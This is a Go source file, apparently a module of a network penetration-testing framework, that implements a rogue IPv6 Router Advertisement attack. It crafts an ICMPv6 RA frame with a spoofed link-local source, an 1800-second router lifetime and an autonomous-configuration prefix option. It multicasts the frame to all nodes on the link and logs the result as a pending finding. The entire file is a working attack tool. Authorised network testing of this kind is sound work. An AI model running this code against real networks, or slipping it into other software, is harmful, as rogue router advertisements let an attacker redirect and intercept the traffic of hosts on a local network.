// roguera.go implements the rogue router advertisement attack behavior.
//
// Durability (from the catalog): transient-decay. The attack sends a
// Router Advertisement claiming to be a router with a ~1800s lifetime.
// The RA lifetime decays after the attack stops, and no explicit teardown.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type rogueRAFinding struct {
	Action         string `json:"action"`
	RouterLifetime uint16 `json:"router_lifetime"`
	Prefix         string `json:"prefix"`
	DecayNote      string `json:"decay_note"`
}

// RunRogueRA sends one Router Advertisement for the target's IPv6 prefix
// from the attack leg's MAC and its EUI-64 link-local address, with the
// 1800 s router lifetime the catalog carries as the decay bound. The
// preferred lifetime and flags are probe content. The verdict is pending:
// whether hosts took the router needs a probe of their tables it does not
// have.
func RunRogueRA(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldPrefix6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC

	pkt, err := craftRogueRA(src, deps.Target.Prefix6)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguera: craft RA")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguera: send RA")
	}

	detail, _ := json.Marshal(rogueRAFinding{
		Action:         "rogue-router-advertisement",
		RouterLifetime: 1800,
		Prefix:         deps.Target.Prefix6.String(),
		DecayNote:      "~1800s lifetime announced",
	})
	deps.Emitter.Finding("ra", detail)

	return check.Pending("no observable: router acceptance needs a probe of a host's router list"), nil
}

// craftRogueRA builds a Router Advertisement from the rogue router
// announcing prefix.
func craftRogueRA(src net.HardwareAddr, prefix *net.IPNet) ([]byte, error) {
	linkLocal := linkLocalFromMAC(src)
	prefixLen, _ := prefix.Mask.Size()

	eth := &layers.Ethernet{
		DstMAC:       allNodesMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      linkLocal,
		DstIP:      allNodesIPv6,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeRouterAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	// Prefix info option: the prefix, valid 1800s, preferred 1200s.
	prefixData := make([]byte, 30)
	prefixData[0] = byte(prefixLen)
	prefixData[1] = 0xC0                               // flags: L=1, A=1
	binary.BigEndian.PutUint32(prefixData[2:6], 1200)  // preferred
	binary.BigEndian.PutUint32(prefixData[6:10], 1800) // valid
	copy(prefixData[14:30], prefix.IP.To16())

	ra := &layers.ICMPv6RouterAdvertisement{
		HopLimit:       64,
		Flags:          0,
		RouterLifetime: 1800,
		ReachableTime:  0,
		RetransTimer:   0,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptPrefixInfo,
				Data: prefixData,
			},
			{
				Type: layers.ICMPv6OptSourceAddress,
				Data: src,
			},
		},
	}
	return craft.Default(eth, ip, icmp, ra)
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6RouterAdvertisement)(nil)
